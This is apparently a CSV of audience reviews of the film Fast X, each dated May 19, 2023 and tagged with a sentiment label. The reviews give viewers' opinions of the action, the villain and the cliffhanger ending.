"May 19, 2023",POSITIVE,Amazing. Family is back on the menu.
"May 19, 2023",POSITIVE,"Continuity of the story was fantastic.  As always, suspend disbelief!  But it was a Fast & Furious ride for sure! And the two surprise appearances at the end? So fun!"
"May 19, 2023",POSITIVE,"It was action packed, fun and some what unpredictable. With the ending it had to be an 11."
"May 19, 2023",POSITIVE,"Fast X brings back the stakes and high emotions that were missing for many years, manages it's huge family pretty well, contains a great performance by Jason Momoa, and still has the over-the-top action (although brought down a little bit)."
"May 19, 2023",NEUTRAL,"Fast X is probably a top 5 Fast and the furious movie, the performances were great all around and it’s action packed from start to finish and Jason momoa is a great villain  he is funny and serious when needed the movie is balanced well as almost everyone has their moment to shine a good 8.5/10"
"May 19, 2023",NEGATIVE,The way they had Jason momoa acting ruin the movie
"May 19, 2023",POSITIVE,This movie was non stop action! I love how the storytellers tie everything together! If you’re a fan of fast and furious this one won’t disappoint! Go into the movie and just enjoy the ride as we come to the end! Can’t wait for part 2 and 3! Family! 
"May 19, 2023",POSITIVE,"If you liked any of the previous 9 films, you are going to love this one! Was a really fun ride."
"May 19, 2023",NEGATIVE,At this point they’ve overplayed their hand . Films gotten stale
"May 19, 2023",POSITIVE,Loved the movie! It was great to see them all on our screens again and how the work well together! Can’t wait for the next installment!!
"May 19, 2023",POSITIVE,The movie was good I just wish the couple in front of me wouldn't be so lovey dovey it takes away the movie experience for me personally and it's really cringy😔😞
"May 19, 2023",POSITIVE,Better than f9! Jason mamoa steals the show and everyone that returned was awesome! Interested on how they are going to end it now stay after credits !
"May 19, 2023",NEGATIVE,"If it wasn't for Aquaman, the movie would just be another boring bit about family and ridiculous car obsessions and chases that we all know, no one could possible survive, physically or mentally. 
Did I mention the constant annoying family talk. Olive Garden gave them permission for this????? Anyway. If there are more movies in this franchise, I don't think I will be watching anymore."
"May 19, 2023",NEUTRAL,"Really doesn’t detach itself very far from the previous movies. Looks fantastic and is joyful to watch, but adds little to the repeated formula. Started out very strong but lags as it goes on and certain twists don’t even catch too much audience attention. A few moments showed impressive attention to detail."
"May 19, 2023",POSITIVE,It was awesome. Loved Jason Momoa. Cant wait to see it again
"May 19, 2023",POSITIVE,Muy buen servicio? A veces pero hay un personal  bien feos en la ventanilla
"May 19, 2023",NEGATIVE,I feel like that was 1 of the top 3 stupidest movies I have ever seen in my life. I cannot begin to explain how stupid this movie is. From 1 to 10 it's 300 on the stupidity range. They didn't even have a decent car anywhere in it. John cena smuggled a plane onto a plane. Holy hell it is so stupid.oh and BTW they have a submarine now. Because apparently if you have the skill to not turn the wheel for 10 seconds you can manipulate a submarine. I cannot convey how stupid this movie is
"May 19, 2023",POSITIVE,"Loved It!!!  Lots of car chases, explosions, and all out ridiculousness that we want from this franchise."
"May 19, 2023",POSITIVE,Exceeded Expectations
"May 19, 2023",NEGATIVE,Should have really stopped after Furious 7. Boring. Over the top nonsense.
"May 19, 2023",POSITIVE,"It was a good movie , lots of action and funny comedy great for solo or family ."
"May 19, 2023",POSITIVE,"In terms of the franchise it's what you might expect. Impressive cast list. But Jason Momoa's portrayal of Dante is everything. If you are a Momoa fan or follow his work you'll no doubt enjoy this. He certainly made it for me. Momoa brings all the fun, quirky, unique masculinity/femininity traits he personifies in real life. He brought the spice in all the good ways. Bless 😊🙏🏼💗"
"May 19, 2023",POSITIVE,"Great addition to the Fast Franchise! Way to bring the movie back to earth with a lot of action, humor and honor to the family! #FURIOUSLYFUN"
"May 19, 2023",NEGATIVE,Continues to get further and further away from what got the movie series off the ground. Everything and everyone appears to be indestructible. They could've also just called it Expendables 4: The family.  And you wouldn't know the difference.
"May 19, 2023",NEGATIVE,cinematic equivalent of a monster energy drink.
"May 19, 2023",POSITIVE,"Saw it yesterday. Vast improvement over Fast 9. The chemistry between the characters is better, the action scenes impressive and fun to watch. The over the top pieces are still there but toned down a bit compared to Fast 9. There are no lengths or breaks in this movie, there is always something interesting happening. Jason Momoa was an excellent antagonist and played a cross between the Joker and Jack Sparrow. I can understand that the ending is unsatisfying if you expect a final entry, it was even unusual for the franchise that always with the family together. But at my theatre everyone left the seats happy and entertained, so I guess most people already know there will be one (or two?) more."
"May 19, 2023",NEGATIVE,The action was cool but overall pretty bad the beginning was terrible. The best part of the movie was Jasons performance other than that pretty much the same as all the other movies and the same old jokes with ludacris and tyrese didn't hit at all not one person laughed at any of them also  John cena was good too
"May 19, 2023",POSITIVE,This by far has is the best fast and furious Ive seen.  Action throughout the whole movie!!!
"May 19, 2023",POSITIVE,It's ridiculously entertaining. Momoa steals the show.
"May 19, 2023",NEGATIVE,Bad acting bad CGI bad story. Would not watch again
"May 19, 2023",NEUTRAL,Been waiting and it was amazing!!! Cant wait for the next one.
"May 19, 2023",POSITIVE,This movie have you on the edge of your seat. All action and it keeps you guessing what is next.
"May 19, 2023",POSITIVE,"Fast X is an amazing movie for the true fans of this epic family. I dare say that it is one of the most nostalgic of the entire franchise and makes you very excited in all its time. The fight scenes are well choreographed, each mini plot is well told and all connected in some way to the main plot. The new characters are intriguing and excellent. The highlight is Jason Momoa who looks absolutely fabulous in his role and delivers an incredible performance. The new adventure puts Dom in terrible situations and with that brings the classic feeling of the saga. The film is really a tribute to fans who like the direction the saga has taken since its 5th film. Very interesting the way they made the team this time divided in several places, not giving too much attention to all the story so the fans stay curious to the next part. In addition to that, another very positive point about the film was a slight reduction of the exaggerated and extremely unrealistic scenes as in the 9th film. To conclude, Fast X knows how to bring the first part of a possible trilogy in an optimal way. The ending is insanely exciting and leaves you looking forward to the future. Post credit is another amazing surprise to the fans."
"May 19, 2023",NEGATIVE,If it wasn't for Jason Momoa then the movie would be a snoozefest!!!
"May 19, 2023",POSITIVE,It was definitely fun to watch.  Very entertaining.
"May 19, 2023",POSITIVE,So fresh funny and entertaining. Must see! Movie. better get ready for what comes next👍🏽👍🏽👍🏽
"May 19, 2023",POSITIVE,Can't wait for the next one.
"May 19, 2023",POSITIVE,"If your a Fast and Furious fan this is probably gonna be one of your favorites. The action is actually on a new high level with great camera work, fight scenes, and explosions. The addition of the new cast is top notch.  Brie though her screen time is limited is great here. But by far Jason Mamoa steals the the movie. Mamoa with a combination of just pure evil mixed, with absolute golden gender bending sexuality bending comedy is so funny. Unfortunately it kinda ends just out of nowhere with a clifffhanger but all in all a great installment and a good start to this ending trilogy."
"May 19, 2023",NEGATIVE,"Stupid movie not what I was expecting after all the good movies from the saga 
Really sad this one didnt make the cut 
Ending was terrible"
"May 19, 2023",POSITIVE,"This is my review of FAST X

Bro wtf did I this watch this probably one of the best fast films since 6 not only someone that we all thought die in fast 6 is come but the man himself is back not saying who this watch the film and dom has powers when you have family but I will give this a rated 9.5/10"
"May 19, 2023",POSITIVE,FAMILY enough said go watch it
"May 19, 2023",NEUTRAL,Good action scenes and sound effects.  Nice cliffhanger.
"May 19, 2023",POSITIVE,"Had a great time! Mamoa was good, waitin for 11."
"May 19, 2023",NEUTRAL,"Definitely the best one since the 6th movie (Besides Hobbs and Shaw which was good). It isn't perfect but I was entertained the whole time. In terms of defying physics and gravity, this one was the most grounded one since the 6th one. Yes some of that crazy stuff happens but they dialed it back just enough for me to stay involved. They set up a great ending for the next movie and for the first time in many movies I'm excited for what comes next. 7/10"
"May 19, 2023",POSITIVE,What an amazing movie!
"May 19, 2023",POSITIVE,prob the best fast & furious movie they ever created. looking forward to part 2
"May 19, 2023",POSITIVE,Great action! A lot better than 8 or 9 for sure
"May 19, 2023",POSITIVE,"я в шоке о того, что серия фильмов развивается"
"May 19, 2023",POSITIVE,"Jason Momoa,the next Joker🤔"
"May 19, 2023",POSITIVE,I love it I would go back see it again
"May 19, 2023",NEUTRAL,"It was full of crazy up’s & down’s, back & forth’s, but kinda fun in its own way than the other Fast & Furious….but the last bit of it got to be to much I felt, & left to many thing’s hanging???"
"May 19, 2023",POSITIVE,All the throwbacks from the early movies were great.
"May 19, 2023",POSITIVE,Can't wait for Fast XX
"May 19, 2023",NEGATIVE,Man whats with making it into more parts. Going to make me pay again to finish
"May 19, 2023",POSITIVE,"Incredible. I lost hope with this franchise, but this was one of the best if not the best since 1 and Tokyo drift. Action packed, got drama and comedy. Jason momoa was just great! Stole the show! I did not expect the cliffhanger ending, it kept me wanting MOREEEEEE! Funny cameos, heart warming cameos, intriguing cameos. 2.5 hour run time flies by, trust me."
"May 19, 2023",POSITIVE,Enjoyed the movie from beginning to the end
"May 19, 2023",NEGATIVE,Too cheesy…only worthy part was the credit scene
"May 19, 2023",NEGATIVE,Terrible terrible sequence it's about family but everyone died and the ending could've been way better very disappointed tomatoes tomatoes
"May 19, 2023",NEGATIVE,Money grab and the series
"May 19, 2023",POSITIVE,Love it but I am a need and love all of them.
"May 19, 2023",NEGATIVE,"It's goofy and silly, not for me"
"May 19, 2023",POSITIVE,It's been a while since I've really enjoyed a Fast and Furious movie! This was great!
"May 19, 2023",POSITIVE,"You want action, you got action ....... makes John Wick 4 look like kid's play!"
"May 19, 2023",POSITIVE,"I loved every moment of it! The perfect part 1 to the conclusion! Im a lifelong fan, and it checked all my boxes. Had the feel of the old films with a fun glorious flourish of new! All the characters were amazing, and I love Dante so much as villain! Everyone killed it. So many amazing cameos too!"
"May 19, 2023",POSITIVE,Nice good action popcorn fun
"May 19, 2023",POSITIVE,Just awesome! Can’t wait for the next
"May 19, 2023",POSITIVE,super good with many emotions
"May 19, 2023",POSITIVE,Jason Mamoa plays a great psycho. He makes the movie 8/10 for me
"May 19, 2023",NEUTRAL,"The movie isnt the the best of the franchise, but it is alot of fun. Jason mamoa is definetly the best part, some plot thing anoyyed me, and the famila was to big so they dodnt jave alot of scene together, they were split in Group trougth out most of the movie.Overall I would recommedb this to people that like the fast movies, if not this woundt change your opinion about them.
6+/10"
"May 19, 2023",POSITIVE,I Really Enjoy this Movie Nice
"May 19, 2023",NEGATIVE,"Way too hot , the volume is too low and stinks , the movie overall was only good because it was in 4d making it feel real however the ending was trash"
"May 19, 2023",POSITIVE,Part 11 coming soon! It was so good cant wait for the next one
"May 19, 2023",POSITIVE,Here is where action takes place and race being born..
"May 19, 2023",NEUTRAL,This was good movie but boring for a little time and the movie is dramatic but I still recommend it.
"May 19, 2023",POSITIVE,"Amazing actors, funny, and filled with action. Keeps you on the edge of your seat!"
"May 19, 2023",POSITIVE,Fast10 your seatbelts
"May 19, 2023",POSITIVE,"This was an absolute wild ride. First of all, let me just say that Jason Momoa being casted made me worried- but after watching this movie, I gotta say he was the best villain out of the whole franchise. I love all of the call backs and references to old movies, showing us old characters we forgot about. I felt like I was on the edge of my seat the entire time. I genuinely can not wait for part 2."
"May 19, 2023",NEUTRAL,I liked the villain and some funny dialogue. What I disliked were some scenes that were too much
"May 19, 2023",POSITIVE,IN ALL CAPS I LOVED IT LIKE OMG I WAS OFF THE EDGE OF MY SEAT AND I WAS SAD AND HAPPY THERE WERE TWISTS AND TURNS AND I LOVED IT WHEN THEY WENT BACK TO WHERE THEY STOLE THE VAULT AND THEY HAD FLASHBACKS WITH PAUL WALKER IN IT AND FAST 10 WAS BASED ON THAT AND THE REVENGE NOT ONCE DID DOM GIVE UP ON ANYONE NOT ONCE AND I CAN NOT WAIT FOR WHAT THEY DO FOR THE SECOND PART ABOUSLTY WILL BE A DIE HARD FAN
"May 19, 2023",POSITIVE,I liked the story line & powerful individual actors that were cast.  I liked the fast cars & exciting twists & plots.  Van Diesel & Jason Mamoa are super Awesome!  Great combination!!  The music was awesome!!
"May 19, 2023",POSITIVE,"I love the movie. It's fun, wild and everything you'd expect from a Fast And Furious movie. Yes it hasn't been believable since Fast 5 and this one is no different. But I don't expect Shakespeare from the Fast And Furious movies. Highly recommend it."
"May 19, 2023",NEUTRAL,Jason Mamoa. GREAT addition to the franchise. and as the villain. he brought a lot of character and whatnot. it was enjoyable. but still..... how did we get from street racing. to robbing banks which was not bad. but awesome. to driving down a damn (seen in the trailer) a lot of fun. but don't take it too serious
"May 19, 2023",NEUTRAL,CGI was subpar and Momoa over the top antics were a bit much but overall I had fun
"May 19, 2023",POSITIVE,"its a FaF movie i mean the impossible things that can't be done will be done nevertheless i think this movie has the best final scene i've ever seen in a long time, because its not just de scene its what makes you feel"
"May 19, 2023",POSITIVE,"just saw the movie. a f 


just saw the movie, and it did not disappoint.  full of action and surprises. can't wait for the next one."
"May 19, 2023",POSITIVE,"8 stars if I could! Haters will Hate, totally loved the movie! Great homage to the entire franchise!"
"May 19, 2023",POSITIVE,"GREAT OVERALL Fun and entertaining . Had its unrealistic moments.Amazing graphics and all kinds of action. You got it all fight scenes ,drift scenes, race scenes,sad and happy scenes, shooting all kinds of weapons scenes . Some great laughs  and some lame stuff. Great Villan and slightly unexpected acting from Mr Aquaman at least 3 actors from DC Universe 👏 Story some what makes sense. Solid 8/10"
"May 19, 2023",NEGATIVE,Just not what The fast and furious used to be. (no racing at all. Weird short unexplained/nonsense scenes. By far the worst cliff hanger at the end. Hopefully part 2 will be much better.
"May 19, 2023",POSITIVE,Jason Momoa steals the show. Best Fast in a while. They just earned themselves 3 more movies 😂😭
"May 19, 2023",POSITIVE,"All Action, the Crew Amazing all the team Together"
"May 19, 2023",POSITIVE,I liked way better than 9 and Jason Momoa did good job. Rotten tomatoes doesn't even have taste in movies the high score shit movies so rotten tomatoes kiss off you circus clowns.
"May 19, 2023",NEGATIVE,Honestly they ruined it with that bad guy
"May 19, 2023",POSITIVE,"Its one helluva good time, gonna go watch it again, really looking forward for whats next"
"May 19, 2023",NEGATIVE,Super fake. So many scenes seemed so out there vs reality. Its gotten so far away from where it all started. Weve watched them all though so we cant skip any now.
"May 19, 2023",NEGATIVE,Why do they keep making them ? Is there a point this one was as bad as the last one sure the action scenes are done well but you expect me to believe a car is gonna do a perfect 360 flip off an explosion or that somehow some way some mechanic can beat up a highly trained assassin … if you have a brain don't watch it
"May 19, 2023",POSITIVE,Great movie but ending was weird definitely could of ended differently
"May 19, 2023",POSITIVE,"Just when you want to admit that think they made too many films in the franchise, they pull a rabbit out of the hat and find a way to entertain us once again in what is part one of a multi-series finale. Watching this in 4DX was an awesome experience and it was a perfect film to enjoy it as so!"
"May 19, 2023",POSITIVE,"Exhilarating, action packed, surprises, kept my at the edge of my seat"
"May 19, 2023",NEGATIVE,"I only counted 17 times ‘family’ was said. As usual, over the top, anything can happen, near impossible is possible movie. I laughed through out it"
"May 19, 2023",NEGATIVE,This movie has a negative message for kids ( toretto sons is already killing people at age 10 ) also producers are running out of ideas
"May 19, 2023",NEUTRAL,Just as over the top entertaining as usual!
"May 19, 2023",POSITIVE,"Put the brain away, nonstop fun and action. Well worth watching in theaters!"
"May 19, 2023",POSITIVE,part two coming out in 2025 is beyond crazy 🤣
"May 19, 2023",POSITIVE,What else you want in the cinema?.
"May 19, 2023",POSITIVE,I'd like to see critics and nay-sayers make a better movie
"May 19, 2023",POSITIVE,Redeemed itself after 9. Can't wait until the next one!
"May 19, 2023",NEUTRAL,Most outlandish one yet… turn your brain off and enjoy the ride of family
"May 19, 2023",POSITIVE,"A fun ride from start to finish, and Jason Momoa was perfect as the villain. Can't wait for the final chapter!"
"May 19, 2023",POSITIVE,Fun ride - who doesn’t like explosions and fast cars? The movie started to get quite cartoony at the end however but will be counting down the days until part 2 hits the theaters!
"May 19, 2023",POSITIVE,Soooo good!!! Action scenes were awesome!
"May 19, 2023",POSITIVE,I love the fast saga but this forgot the rock and I hope the new ones its a little bit better its really good I do recommend it to watch if you like cars
"May 19, 2023",POSITIVE,"DO NOT LISTEN TO THOSE MEAN CRITIS.! Just left the cinemas in IMAX, that's right in IMAX at AMC Niles 12. Better than 8&9, but not as good as 5,6, 7, but still a good better time. Jasion Mamoa is a great villian and loved how the movies dove deeper with past films expanding some characters lore and dynamics. Full Review on the Youtube Channel coming tomorow. Fun crazy action like other films, but not as crazy as going into space lol. With an ever expanding cast it was great to see ""The family"" grow closer and bigger since those are A-list stars."
"May 19, 2023",NEGATIVE,"CGI was bad, dialogue was super stiff, story was bad. The movie is super corny and cheesy. I was laughing on my way out of the theater in disbelief of how bad the movie was lol"
"May 19, 2023",NEGATIVE,"Average fare. All the so-called ""wow"" action sequences of cars being confused as Moto X bikes and brining down choppers have been used in trailers and extended trailers. Can sit this one out and wait for the XI because there is something delicious ""cooking""."
"May 19, 2023",POSITIVE,A silly showcase of cartoon physics. incredible spectacle.
"May 19, 2023",NEGATIVE,Movie was great.  Didn’t like the ending.  I was under the impression that this was the final installment to the fast saga.
"May 19, 2023",NEUTRAL,"Nadie tiene sentido.. pero es buena, una clásica rápido y furioso !!"
"May 19, 2023",NEGATIVE,"I viewed the film and agreed with the RT review.
The story could be better. Jason Momoa steals the show with his outstanding acting. A good connection showed with Fast Five's ending. It was good to see Fast Five's ending and Paul Walker on the big screen again.
The movie is interesting in the first half, but it becomes a little boring in the second. In the Fast franchise, a team of people work together to complete missions; however, in this film, only Dom Dom Dom is present, and the team is elsewhere.
There should be something to hype the audience for the next part because the ending is not very good. Greatly missed Paul Walker."
"May 19, 2023",POSITIVE,"The action was great and it seemed never ending. However, there were a lot of loose ends. What happened to Cipher and Letty? Did Dante bite it? Or not.
Jason Momoa was great playing the psycho to the fun loving hilt!
It's a long movie."
"May 19, 2023",POSITIVE,"This is the start of ""Infinity War"" of the Fast saga."
"May 19, 2023",POSITIVE,It’s was entertaining but very over the top.
"May 19, 2023",POSITIVE,Great action as always with the Fast Saga.
"May 19, 2023",NEUTRAL,"Unwanted sequel 

Jason momoa (Dante) show stealer (but he acts like JACK SPARROW) and John cena (uncle jakob) extension of peace maker,
Chase and stunt sequences were out of the world. Rome chase and Dam sequence lit🔥
Now the problem is lack of story and screenplay FAST X was a strong Durable building with a weak basement, unwanted continuation, every character from the previous films were looks boring mainly Dom, Han, Roman and Letty 😔, Jason Statham was wasted in FAST X.
If a character dies in Fast series they will be back within 2 movies, 
then LETTY dies and came back - Han dies and came back - Gisele dies and now came back
Now Roman, Jakob and the whole team died but they will be back in FAST XI 🤡

Finally HOBBS makes the whole Theatre erupt 🔥"
"May 19, 2023",POSITIVE,Good movie all of it I love all
"May 19, 2023",POSITIVE,Sheesh what a movie.
"May 19, 2023",POSITIVE,"The action starts fast and continues throughout the film bring's the twist and turns we've come to know and expect from this franchise with a simple but poetic nod to the late Paul Walker. The Villian is probably a dud in this very dark character but the ending is a cherry on top with the ""big guns"""
"May 19, 2023",POSITIVE,For me it was AWESOME. VIN & JASON!!! Cars and Travel!!!! Going to see again every weekend!!!!
"May 19, 2023",NEUTRAL,was funny but fulsome
"May 19, 2023",NEUTRAL,"Seemed a little long. Otherwise, wow, what a story. What a ride! Jason Momoa is just straight something else."
"May 19, 2023",POSITIVE,"This is the best a F&F movie can get. If you know what to expect, it’s that and so much more. Can’t wait for FF11."
"May 19, 2023",POSITIVE,awesome  from  beginning to end
"May 19, 2023",POSITIVE,"Love the Fast Franchise, didnt care for Jason Mamoa blowing up everything. Kind of felt like it took away from the actual movie."
"May 19, 2023",POSITIVE,The movie was expected to great and it was GREAT
"May 19, 2023",POSITIVE,Always happy to see Dom in a Charger. Can’t wait for the next film
"May 19, 2023",POSITIVE,it left a cliffhanger as if there will be a Fast 11 when it was said to be the last of the Fast Sagas!!!
"May 19, 2023",NEUTRAL,Lots of action the end made me angry lol great movie tho
"May 19, 2023",POSITIVE,This is the greatest movie ever made!
"May 19, 2023",POSITIVE,"Jason Momoa was fantastic. At this point, they're all in on the joke on how ridiculous it is. But Momoa's character....breathed new life back in the series."
"May 19, 2023",NEGATIVE,"4/10 @best and that is being kind only for Paul Walker's sake. It did at least commit to being an absolutely over-the-top ridiculous film, but it made no sense.
Here's my ten quick points on Fast X. Mild-spoilers.
1) The dialogue is utter garbage. Not even memeable jokes.
2) Too many characters. Dom plays his character straight. The women characters are played straight. The other male characters are tag-alongs or campy mccamp, especially Jason Mamoa, who may earn the Razzy for this performance.
3) Terrible writing, even for a FF film. I understand this is a FF movie, and I know to lower my expectations, but it seriously does not make sense. You probably have to watch all 9 films right before you go watch Fast X to understand what's happening. It is more of the ""And then, and then, and then, and then"" writing.
4) The editing SUCKS. This film was sliced and diced and sewn together with barbed wire. So many scenes have hard cuts to different angles where the characters are in mid-movement, change with jarring facial expressions. It is awful.
5) Queen Brie really seems broken by Hollywood. She's still as wooden as they come. How did this lady ever earn $1 billion at the box office and how did she win an Oscar. Zero charisma and zero gravitas.
6) The stunts were lacking and resorted to terrible CGI. Worse than even the most self-indulgent Michael Bay films.
7) There is a plot line with a kid that really just doesn't fit at all. It is cringe. The kid was fine. He acted like a kid. The situations he's put in by adults are stupid.
8) Too long. I started to feel tortured by the end. There is a mid-credit scene that will make your eyes roll into the back of your head and down your throat. NO END CREDITS SCENE.
9) I felt some resentment from the people who made this film. Not any of the actors. I legit think they tried their best with what they were given. But I think this was Hollywood saying ""fine you want mindless entertainment. We'll give it to you, and you'll eat the absolute garbage tier we serve you."" They are so bitter audiences don't want their dramas and politics shoved down their throats.
10) I will be shocked if domestic tickets sell very much. The only think that might save this film (and franchise?) is the international market."
"May 19, 2023",NEUTRAL,ok so fast cars yes. Family yes. Bad guys yes. things that defy logic definitely. what else would you expect from this franchise. Storyline loses its appeal but action packed.
"May 19, 2023",POSITIVE,"When new movies are added to this franchise; it can't stop me from wanting more! All the plot twists, cliffhangers and nonstop action is what I love most about the Fast and Furious Saga. People that are no longer interested in the films claim the scenes are ""unrealistic,"" I see that as the beauty in all of it! As a director and an amazing cast come together, possibilities are endless and I love the creativity! They create stories that stick out in the movie industry. Don't get me wrong, it's not the same without Paul, but I hope he is looking down on the amazing story this series continues to tell."
"May 19, 2023",NEUTRAL,The fighting sequences are almost unwatchable.  There are too many middling characters and nobody ever dies.
"May 19, 2023",POSITIVE,"Do I recommended it? Sure if your main motivation is to see a nonstop action movie (with some beautiful cars in it), and don’t really care about the narrative. 
I am not a Fast “fan”. But I have seen maybe two or three of the franchise movies, and found them to be entertaining. 
I went to see this movie mainly because of the addition of Jason Momoa to the cast, as I have found most of his movies, enjoyable. After deliberating on whether or not to go, it turns out I’m glad that I did. 
It’s not an Oscar worthy movie, but it is filled with lots of action, surprises, and humor. Everything I would expect out of a Fast action movie. 
It is a must see in a theater type of movie. No way to get the same effect at home."
"May 19, 2023",POSITIVE,I LOVE THIS MOVIE. BEST MOVIE OF MAY 18 2023.
"May 19, 2023",POSITIVE,Great scenes. Tasteful action and many laughing moments.
"May 19, 2023",NEGATIVE,They should have stopped at 7
"May 19, 2023",POSITIVE,AMAZING!! Really caught me off guard
"May 19, 2023",POSITIVE,Freaking awesome!!! Action packed!!! Ready for 11!!!
"May 19, 2023",NEGATIVE,The scripts get more and more ridiculous with each movie.
"May 19, 2023",POSITIVE,"omg, this movies never ever disappoints, and they alway have you with the Jesús en la boca."
"May 19, 2023",NEUTRAL,It’s better than 8 & 9 but it’s still non sense especially the ending… it’s legit the just like the marvel fake death universe unless you see the body they’re likely not dead… that’s all I’ll say 😂😂😂
"May 19, 2023",POSITIVE,Constant action!! Wondering what's to happen next!... Jason Mamoa was the joker in this film for sure!!  I'm super excited to see what they're gonna do next!
"May 19, 2023",POSITIVE,IT WAS AMAZING!!!!!!! Ill be back!!!!!
"May 19, 2023",POSITIVE,That was honestly a really good time!
"May 19, 2023",POSITIVE,I LOVED THE F***ING MOVIE!!!!!!!!!
"May 19, 2023",NEGATIVE,One of the worst movies I've ever seen. Way too much CGI the action scenes were terrible. The storyline is non existent. The lines in the movie were cheesy. The movie should have never made it in theaters.
"May 19, 2023",NEGATIVE,It was real good with the way they started portraying it. Full fake action movie. Took the title for worst fast and furious ever.
"May 19, 2023",POSITIVE,Fast X is a very good time movie to watch
"May 19, 2023",NEGATIVE,Had to explain the powder??? scene to my son. Also a lot of fake must be luck scenes.
"May 19, 2023",POSITIVE,"Movie was insane, of course it’s far fetched but it was a solid move. Can’t wait for part 2"
"May 19, 2023",POSITIVE,Reallly good pt 2 let’s go
"May 19, 2023",POSITIVE,"Must Watch... Incredible, Awesome Movie...$"
"May 19, 2023",POSITIVE,once again unbelievable stunts and fast cars
"May 19, 2023",POSITIVE,"Amazing action pact movie drama love, etc. just like always"
"May 19, 2023",POSITIVE,It's Fast and furious...That's all tha needs to be said...LOL
"May 19, 2023",NEUTRAL,"Way better than F9, action totally unbelievable but that why I show up. F11 and 12 got some explaining to do thou..."
"May 19, 2023",POSITIVE,Who stole the show?  That’s not the focus if you been down since day one.
"May 19, 2023",NEGATIVE,Seems like more of a parody than anything else.
"May 19, 2023",POSITIVE,"Great movie, Jason Mamoa officially steals it"
"May 19, 2023",POSITIVE,"This movie was really good in my opinion. The villain was amazing, the music was good, and the action was excellent. It's just that we've seen the family go through this multiple times in films prior so it feels the same. As it's own movie I enjoyed it but it doesn't really fit that well into the franchise."
"May 19, 2023",NEUTRAL,"Much of the dialogue was poorly written, as in the last few Fast movies some of the action was not believable, but there was alot of action and it was entertaining for the most part."
"May 19, 2023",POSITIVE,Very actionable and awesome
"May 19, 2023",NEUTRAL,Movie was long and kind of corny
"May 19, 2023",POSITIVE,"So many twists and turns But it Emphasizes the fact that Family (Whether youre born into it, or its Grown from Who You can trust and have a common Cause in life) Is The MOST Powerful Force On Earth!!!
And it Emphasizes that EVERYONE in a family has Worth No matter how great or small you feel or seem!!!
Salud la familia para siempre!"
"May 19, 2023",POSITIVE,Better than the last 2 combined!
"May 19, 2023",POSITIVE,AWESOME MOVIE!!!!!!!!
"May 19, 2023",POSITIVE,Fast moving from the beginning!
"May 19, 2023",NEGATIVE,"If a shark jumped the shark, but knew it was doing it and was just trying to have fun. Also only half a movie in plot. Shout out to Momoa for making it worth the ticket with his genuinely unique villain that unexpectedly carried most of the film."
"May 19, 2023",POSITIVE,"The whole movie was action filled and hilarious! 10/10 recommend... Also, don't forget about the after credits 😉😎"
"May 19, 2023",NEGATIVE,It was a complement of the past movies. Not really excited
"May 19, 2023",POSITIVE,"Amazing movie and addition to the Fast and Furious franchise! Lots of actions and keeping you on the end ge of your seat! Every performed beautifully and lot of surprises throughout the whole movie, would watch again!"
"May 19, 2023",POSITIVE,Best fast movie ever
"May 19, 2023",POSITIVE,Best Fast & Furious movie to date!!! Awesome!
"May 19, 2023",POSITIVE,How do you bring Gisele back????  Loved the more tuner cars. Why kill Jacob?
"May 19, 2023",NEUTRAL,"As always The Fast & Furious franchise comes with another film full of thrill and action challenging the laws of physics which is nothing new to fans. The transition of events is what really makes this movie entertaining and the great performance of the villain. With an “Unfinished” end, can’t wait for second part!"
"May 19, 2023",POSITIVE,Love it! Every second of it! Actioned packed and never a dull moment!
"May 19, 2023",POSITIVE,It was Awesome!!! so much actoon and great cars!!!
"May 19, 2023",POSITIVE,LOVED IT GOING AGAIN!!!!
"May 19, 2023",POSITIVE,"Like: the continuous action. Dislike: Jason Momoa’s character, it was like inserting a cartoon into the movie at times. The sad part is we’ll have to endure him in the 2nd part. Dislike: making it a two-part movie."
"May 19, 2023",NEGATIVE,"F&F lifelong fan here. Way too bloated, even for this franchise. With this many characters, it needs to be a 3 + hour film. Disappointed Jordana Brewster was hardly in the film, and without her, there's no heart to root the film in. Directing and Cinematography was terrible sad to say. Too much focus on zoomed in action and CG. Although, the story had a lot of potential, it was not executed well at all. It no longer feels like F&F. Suffice to say, this film leaves you underwhelmed and wondering what it could've been if Justin never left the director's chair."
"May 19, 2023",NEGATIVE,"I love fast and the furious movie’s, but this time there was too much effect, too much CGI and too much humbleness Macho man moment."
"May 19, 2023",NEGATIVE,"Oh wow. Here we go. I don't think I've ever been so torn about a movie. This thing was super fun, yet super uneven. A try hard Empire Strikes Back.  Couldn't help but laugh at all the wrong things during this flick. At a certain point, I just wanted them to cut to Tokyo so bad in the hopes we got some actual racing.  The characters were all underwritten, and Jason Momoa as the villain wanted to be The Joker. No wonder Justin Lin quit during production. I'm pretty sure Vin Diesel, and Universal are super happy with creating the next ride at Universal Studios, just wish they had a little more heart, and realism instead of bombarding the audience with terrible vfx, and implausible stunts."
"May 19, 2023",NEGATIVE,I want my money back for that....
"May 19, 2023",POSITIVE,Excellent movie !!!!!
"May 19, 2023",POSITIVE,Ridiculous as usual but I love this franchise.
"May 19, 2023",POSITIVE,probably my favorite of the series
"May 19, 2023",NEGATIVE,Horrible. The worst movie they ever mad
"May 19, 2023",POSITIVE,Jason Momoa is the fuck*ng Joker!!!!
"May 19, 2023",NEUTRAL,"I'd like to start off by quoting Youtuber and movie reviewer, Sean Chandler, as he states this film was ""cinematic junk food"" but that is not to say that it was a bad film in the slightest. On the contrary this film was highly enjoyable, such a fun ride with nonstop action but it is not a film that will be receiving any awards. I really liked that this film is heavily connected to Fast 5, my favorite film of the franchise. Jason Momoa as Dante Reyes honestly steals the film with his memorable performance and as many have said, it is very reminiscent in essence to the Joker as he is a chaotic villain who enjoys the suffering he is causing. A critique that I have for this film that I have had for the previous films is how unrealistic and cartoony they have become but this film was definitely a step up. I will rate this film a 7.5 out of 10."
"May 19, 2023",POSITIVE,Awesome movie. Can’t wait for 11
"May 19, 2023",POSITIVE,Great movie! Way better than 9.
"May 19, 2023",NEGATIVE,Its just all bad nothing relating to the originals its just too much going on
"May 19, 2023",NEUTRAL,It's ridiculous but ridiculously fun. I had a blast watching this without thinking too much and just went with the movie's ridiculous flow. Let's bring back all the dead!
"May 19, 2023",NEUTRAL,I did not like the reference to there is no GOD!
"May 19, 2023",POSITIVE,Nobody is winning an Oscar here. F&F movies are what they are. This another mindless absurd movie with no real cohesive plot and corny jokes. I loved it all.
"May 19, 2023",NEUTRAL,"it’s good , i guess i should go back and rewatch the other to recap myself , but it’s very entertaining and the theme of family runs through it all . cool ."
"May 19, 2023",POSITIVE,"A must see. All kinds of action, all kinds of random celebs, the main antagonist crazy interesting. And the ending scenes??? Omfg something I never thought to see again. Amazing movie"
